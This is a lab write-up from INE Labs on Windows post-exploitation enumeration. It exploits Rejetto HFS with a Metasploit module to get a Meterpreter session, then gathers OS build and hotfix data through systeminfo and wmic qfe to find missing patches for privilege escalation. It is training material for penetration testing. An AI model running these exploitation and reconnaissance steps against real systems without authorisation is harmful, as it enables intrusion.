---
title: "Enumerating System Information (Windows)"
description: "Windows post-exploitation system enumeration: hostname, systeminfo (OS, build, hotfixes), installed updates via wmic qfe, and checking for OS hints — focusing on missing security updates for privilege escalation."
date: 2025-12-04
platform: "INE Labs"
difficulty: "Easy"
tags: ["Windows", "Post-Exploitation", "Enumeration", "System Information", "systeminfo", "hotfixes"]
cover: "./photo9.png"
---

# Enumerating System Information (Windows)

**Classification:** Host & Network Penetration Testing / Post-Exploitation<br>
**Target:** Windows host (Meterpreter via Rejetto HFS)

## 1. Executive Summary

After exploiting **Rejetto HFS**, we profile the Windows host — OS version/build, installed
hotfixes and updates — focusing on **missing security patches** that enable kernel/privilege
escalation (feeding tools like Windows-Exploit-Suggester).

## 2. Foothold

```bash
ping -c 4 <target>
db_nmap -sV <target>
use exploit/windows/http/rejetto_hfs_exec
exploit
```

![Ping target](./photo1.png)

![MSF global variables](./photo2.png)

![Nmap scans](./photo3.png)

![Rejetto web content](./photo4.png)

![Rejetto module (1)](./photo5.png)

![Meterpreter session (2)](./photo6.png)

## 3. System Information

```bash
sysinfo
```

![sysinfo](./photo7.png)

```cmd
shell
hostname
```

![hostname](./photo8.png)

```cmd
systeminfo
```

![systeminfo (1)](./photo9.png)

![systeminfo (2)](./photo10.png)

![Hotfixes (3)](./photo11.png)

## 4. Installed Updates (hotfixes)

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Focus on entries described as **Security Update** — gaps indicate exploitable CVEs.

![wmic qfe — updates](./photo12.png)

## 5. OS Hints

```cmd
type C:\eula.txt     # not present here
```

![Checking eula.txt](./photo13.png)

## 6. Notes

The `systeminfo` output (OS build + hotfix list) is exactly what Windows-Exploit-Suggester
needs to match the host against known privilege-escalation exploits.
